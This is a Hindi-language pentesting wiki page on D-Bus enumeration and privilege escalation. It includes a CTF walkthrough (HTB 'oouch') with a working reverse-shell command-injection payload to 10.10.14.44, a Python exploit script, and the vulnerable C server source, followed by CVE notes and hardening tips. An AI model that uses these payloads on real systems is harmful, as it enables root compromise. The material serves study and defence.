# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus का उपयोग Ubuntu desktop environments में inter-process communications (IPC) mediator के रूप में किया जाता है। Ubuntu पर, कई message buses का एक साथ संचालन देखा जाता है: system bus, जिसका मुख्य उपयोग **privileged services द्वारा system-व्यापी संबंधित services expose करने** के लिए होता है, और हर logged-in user के लिए एक session bus, जो केवल उसी specific user से संबंधित services को expose करता है। यहां मुख्य ध्यान system bus पर है, क्योंकि इसका संबंध उच्च privileges (जैसे, root) पर चलने वाली services से है, क्योंकि हमारा उद्देश्य privileges elevate करना है। यह उल्लेखनीय है कि D-Bus की architecture हर session bus के लिए एक 'router' का उपयोग करती है, जो clients द्वारा service के लिए दिए गए address के आधार पर client messages को सही services तक redirect करने के लिए जिम्मेदार होता है।

D-Bus पर services को उनके द्वारा exposed **objects** और **interfaces** से परिभाषित किया जाता है। Objects को standard OOP languages में class instances की तरह समझा जा सकता है, जहां प्रत्येक instance को एक **object path** द्वारा uniquely identify किया जाता है। यह path, जो filesystem path जैसा होता है, service द्वारा exposed हर object को uniquely identify करता है। research के लिए एक key interface **org.freedesktop.DBus.Introspectable** interface है, जिसमें एक ही method, Introspect, होता है। यह method object के supported methods, signals, और properties का XML representation लौटाता है, जिसमें यहां properties और signals को छोड़कर methods पर ध्यान दिया गया है।

D-Bus interface के साथ communication के लिए, दो tools का उपयोग किया गया: **gdbus** नामक एक CLI tool, जो scripts में D-Bus द्वारा exposed methods को आसानी से invoke करने के लिए है, और [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), एक Python-based GUI tool, जिसे हर bus पर उपलब्ध services को enumerate करने और प्रत्येक service के भीतर मौजूद objects को प्रदर्शित करने के लिए बनाया गया है।
```bash
sudo apt-get install d-feet
```
यदि आप **session bus** की जांच कर रहे हैं, तो पहले वर्तमान address की पुष्टि करें:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

पहली image में D-Bus system bus पर registered services दिखाए गए हैं, जिसमें **org.debin.apt** को खास तौर पर highlight किया गया है, जब System Bus button select किया गया था। D-Feet इस service से objects के लिए query करता है, और चुने गए objects के लिए interfaces, methods, properties, और signals दिखाता है, जैसा कि दूसरी image में देखा जा सकता है। हर method का signature भी detail में दिखाया जाता है।

एक notable feature service का **process ID (pid)** और **command line** display करना है, जो यह confirm करने में useful है कि service elevated privileges के साथ चल रही है या नहीं, और research relevance के लिए important है।

**D-Feet method invocation की भी अनुमति देता है**: users Python expressions को parameters के रूप में input कर सकते हैं, जिन्हें D-Feet service को pass करने से पहले D-Bus types में convert करता है।

हालांकि, ध्यान दें कि **कुछ methods को invoke करने से पहले authentication की जरूरत होती है**। हम इन methods को ignore करेंगे, क्योंकि हमारा goal पहले से credentials के बिना अपनी privileges को elevate करना है।

यह भी ध्यान दें कि कुछ services यह जानने के लिए कि किसी user को certain actions perform करने की अनुमति है या नहीं, org.freedeskto.PolicyKit1 नाम की एक दूसरी D-Bus service से query करती हैं।

## **Cmd line Enumeration**

### List Service Objects

opened D-Bus interfaces को list करना possible है:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`** के रूप में चिह्नित सेवाएँ खास तौर पर दिलचस्प होती हैं क्योंकि वे अभी **चल नहीं रही होतीं**, लेकिन एक bus request उन्हें demand पर शुरू कर सकती है। केवल `busctl list` पर न रुकें; उन नामों को उन वास्तविक binaries से map करें जिन्हें वे execute करेंगी।
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
यह आपको जल्दी से बता देता है कि किसी activatable name के लिए कौन-सा `Exec=` path शुरू होगा और किस identity के तहत। अगर binary या उसकी execution chain कमजोर रूप से protected है, तो एक inactive service भी privilege-escalation path बन सकती है।

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) जब कोई process किसी bus से connection सेट up करता है, तो bus उस connection को एक special bus name असाइन करती है जिसे _unique connection name_ कहा जाता है। इस type के bus names immutable होते हैं—यह guaranteed है कि connection के मौजूद रहने तक वे नहीं बदलेंगे—और, इससे भी महत्वपूर्ण, bus lifetime के दौरान उन्हें दोबारा use नहीं किया जा सकता। इसका मतलब है कि उस bus के लिए किसी अन्य connection को कभी भी ऐसा unique connection name नहीं दिया जाएगा, भले ही वही process bus से connection बंद करके एक नया connection बना ले। Unique connection names को आसानी से पहचाना जा सकता है क्योंकि वे—अन्यथा forbidden—colon character से शुरू होते हैं।

### Service Object Info

फिर, आप interface के बारे में कुछ जानकारी इसके साथ प्राप्त कर सकते हैं:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
बस नाम को उसके `systemd` यूनिट और executable path के साथ भी correlate करें:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
यह privesc के दौरान महत्वपूर्ण operational प्रश्न का उत्तर देता है: **यदि कोई method call सफल होती है, तो कौन-सा real binary और unit action को perform करेगा?**

### किसी Service Object के Interfaces की सूची

आपके पास पर्याप्त permissions होनी चाहिए।
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### किसी Service Object के Interface का introspect करें

ध्यान दें कि इस उदाहरण में `tree` parameter का उपयोग करके हाल ही में discovered interface को selected किया गया था (_see previous section_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
इंटरफेस `htb.oouch.Block` की method `.Block` पर ध्यान दें (वही जिसमे हमारी रुचि है)। दूसरे columns का "s" शायद यह दर्शाता है कि यह एक string की अपेक्षा कर रहा है।

कुछ भी खतरनाक आज़माने से पहले, पहले एक **read-oriented** या अन्य low-risk method validate करें। इससे तीन cases साफ़ तौर पर अलग हो जाते हैं: गलत syntax, reachable लेकिन denied, या reachable और allowed.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Methods को Policies और Actions के साथ Correlate करें

Introspection आपको बताती है कि आप **क्या** call कर सकते हैं, लेकिन यह नहीं बताती कि कोई call **क्यों** allowed या denied है। Real privesc triage के लिए आपको आमतौर पर **तीन layers को साथ में** inspect करना पड़ता है:

1. **Activation metadata** (`.service` files या `SystemdService=`) यह जानने के लिए कि कौन-सा binary और unit वास्तव में run होगा।
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) यह जानने के लिए कि कौन `own`, `send_destination`, या `receive_sender` कर सकता है।
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) यह जानने के लिए कि default authorization model क्या है (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Do **not** assume a 1:1 mapping between a D-Bus method and a Polkit action. The same method may choose a different action depending on the object being modified or on runtime context. Therefore the practical workflow is:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` and grep the relevant `.policy` files
3. low-risk live probes with `busctl call`, `gdbus call`, or `dbusmap --enable-probes --null-agent`

Proxy or compatibility services deserve extra attention. A **root-running proxy** that forwards requests to another D-Bus service over its own pre-established connection can accidentally make the backend treat every request as coming from UID 0 unless the original caller identity is re-validated.

### Monitor/Capture Interface

With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.

In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!

Different ways to monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
निम्नलिखित उदाहरण में interface `htb.oouch.Block` को monitor किया जाता है और **message "**_**lalalalal**_**" miscommunication के माध्यम से भेजा जाता है**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
आप `monitor` की बजाय `capture` का उपयोग करके परिणामों को एक **pcapng** फ़ाइल में सेव कर सकते हैं जिसे Wireshark खोल सकता है:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### बस की सारी शोर-गुल को फ़िल्टर करना <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

अगर bus पर जानकारी बहुत ज़्यादा हो, तो इस तरह एक match rule पास करें:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
कई rules निर्दिष्ट किए जा सकते हैं। अगर कोई message _any_ rules से match करता है, तो message print किया जाएगा। जैसे:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
अधिक जानकारी के लिए [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) देखें, match rule syntax के बारे में।

### More

`busctl` में और भी options हैं, [**उन सभी को यहाँ खोजें**](https://www.freedesktop.org/software/systemd/man/busctl.html)।

## **Vulnerable Scenario**

**HTB** के host "oouch" के अंदर user **qtc** के रूप में, आप एक **unexpected D-Bus config file** पा सकते हैं जो _/etc/dbus-1/system.d/htb.oouch.Block.conf_ में स्थित है:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
पिछली configuration से note करें कि इस D-BUS communication के जरिए information send और receive करने के लिए आपको user `root` या `www-data` होना होगा।

docker container **aeb4525789d8** के अंदर user **qtc** के रूप में आप file _/code/oouch/routes.py_ में कुछ dbus-related code पा सकते हैं। यह interesting code है:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
जैसा कि आप देख सकते हैं, यह **एक D-Bus interface से connect हो रहा है** और **"Block" function** को "client_ip" भेज रहा है।

D-Bus connection के दूसरे side पर एक compiled C binary चल रहा है। यह code D-Bus connection में **IP address के लिए listen** कर रहा है और दिए गए IP address को block करने के लिए `system` function के जरिए iptables call कर रहा है।\
**`system` को call जानबूझकर command injection के लिए vulnerable रखा गया है**, इसलिए नीचे जैसा payload एक reverse shell बनाएगा: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

इस page के end में आप **D-Bus application का complete C code** पा सकते हैं। इसके अंदर lines 91-97 के बीच आप **`D-Bus object path`** और **`interface name`** कैसे register किए गए हैं, यह देख सकते हैं। D-Bus connection को जानकारी भेजने के लिए यह information आवश्यक होगी:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
साथ ही, लाइन 57 में आप देख सकते हैं कि इस D-Bus communication के लिए **केवल यही method registered** है, जिसका नाम `Block` है(_**इसी वजह से, अगले section में payloads service object `htb.oouch.Block`, interface `/htb/oouch/Block` और method name `Block` को भेजे जाएंगे**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

निम्नलिखित python code payload को D-Bus connection के `Block` method तक `block_iface.Block(runme)` के जरिए भेजेगा (_note that it was extracted from the previous chunk of code_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl और dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` एक tool है जिसका उपयोग “Message Bus” को message भेजने के लिए किया जाता है
- Message Bus – एक software जिसका उपयोग systems applications के बीच communication को आसान बनाने के लिए करते हैं। यह Message Queue से related है (messages sequence में ordered होते हैं) लेकिन Message Bus में messages subscription model में भेजे जाते हैं और यह बहुत fast भी होता है।
- “-system” tag का उपयोग यह बताने के लिए किया जाता है कि यह एक system message है, session message नहीं (by default)।
- “–print-reply” tag का उपयोग हमारे message को appropriately print करने और किसी भी reply को human-readable format में receive करने के लिए किया जाता है।
- “–dest=Dbus-Interface-Block” Dbus interface का address है।
- “–string:” – जिस type का message हम interface को send करना चाहते हैं। संदेश भेजने के कई formats होते हैं जैसे double, bytes, booleans, int, objpath. इनमें से “object path” तब useful होता है जब हम Dbus interface को किसी file का path भेजना चाहते हैं। इस case में हम एक special file (FIFO) का उपयोग कर सकते हैं ताकि interface को file के नाम में command pass की जा सके। “string:;” – इसका उपयोग फिर से object path को call करने के लिए किया जाता है, जहां हम FIFO reverse shell file/command रखते हैं।

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

`busctl`/`gdbus` के साथ बड़े D-Bus attack surface की manual Enumeration जल्दी ही painful हो जाती है। पिछले कुछ सालों में जारी दो छोटे FOSS utilities red-team या CTF engagements के दौरान इसे तेज कर सकते हैं:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* C में लिखा गया; single static binary (<50 kB) जो हर object path को walk करता है, `Introspect` XML को pull करता है और उसे owning PID/UID से map करता है।
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* यह tool unprotected well-known names को `!` से mark करता है, जिससे तुरंत वे services reveal हो जाती हैं जिन्हें आप *own* (take over) कर सकते हैं या वे method calls जो unprivileged shell से reachable हैं।

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Python-only script जो systemd units में *writable* paths और overly-permissive D-Bus policy files (जैसे `send_destination="*"`) खोजता है।
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module नीचे दी गई directories search करता है और किसी भी service को highlight करता है जिसे normal user spoof या hijack कर सकता है:
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

हाल ही में published CVEs पर नज़र रखना custom code में similar insecure patterns पहचानने में मदद करता है। दो अच्छे recent examples हैं:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root-running service ने एक D-Bus interface expose किया जिसे unprivileged users reconfigure कर सकते थे, जिसमें attacker-controlled macro behavior load करना भी शामिल था। | अगर कोई daemon system bus पर **device/profile/config management** expose करता है, तो writable configuration और macro features को सिर्फ "settings" नहीं, बल्कि code-execution primitives मानें। |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root-running compatibility proxy ने original caller के security context को preserve किए बिना requests backend services तक forward कीं, इसलिए backends ने proxy को UID 0 के रूप में trust किया। | **proxy / bridge / compatibility** D-Bus services को एक अलग bug class मानें: अगर वे privileged calls relay करती हैं, तो verify करें कि caller UID/Polkit context backend तक कैसे पहुंचता है। |

ध्यान देने योग्य patterns:
1. Service **as root on the system bus** चलती है।
2. या तो **no authorization check** होता है, या check **गलत subject** के खिलाफ किया जाता है।
3. Reachable method आखिरकार system state बदलती है: package install, user/group changes, bootloader config, device profile updates, file writes, या direct command execution।

`dbusmap --enable-probes` या manual `busctl call` का उपयोग करके confirm करें कि कोई method reachable है या नहीं, फिर service की policy XML और Polkit actions inspect करें ताकि यह समझ सकें कि **किस subject** को वास्तव में authorize किया जा रहा है।

---

## Hardening & Detection Quick-Wins

* World-writable या *send/receive*-open policies खोजें:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Dangerous methods के लिए Polkit required रखें – यहां तक कि *root* proxies को भी अपना PID नहीं, बल्कि *caller* PID `polkit_authority_check_authorization_sync()` को pass करना चाहिए।
* Long-running helpers में privileges drop करें (bus से connect करने के बाद namespaces switch करने के लिए `sd_pid_get_owner_uid()` use करें)।
* अगर किसी service को remove नहीं कर सकते, तो कम से कम उसे dedicated Unix group तक *scope* करें और उसकी XML policy में access restrict करें।
* Blue-team: system bus को `busctl capture > /var/log/dbus_$(date +%F).pcapng` से capture करें और anomaly detection के लिए उसे Wireshark में import करें।

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
